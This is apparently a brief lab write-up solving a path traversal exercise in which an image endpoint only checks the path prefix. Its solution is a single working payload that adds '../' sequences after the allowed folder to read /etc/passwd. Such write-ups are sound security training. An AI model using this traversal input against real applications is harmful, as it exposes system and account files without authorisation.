Title: File path traversal, validation of start of path
Level: Practitioner
Desc:  This lab contains a path traversal vulnerability in the display of product images.
The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.
To solve the lab, retrieve the contents of the /etc/passwd file. 

Startup request:
![image](https://github.com/user-attachments/assets/8b7b1c75-ea3b-40d0-8b43-f8dbf4a21b95)

Easy one!
payload: `/image?filename=/var/www/images/../../../etc/passwd`
![image](https://github.com/user-attachments/assets/aced28c9-ad20-40bc-a877-ebdc6201fa71)



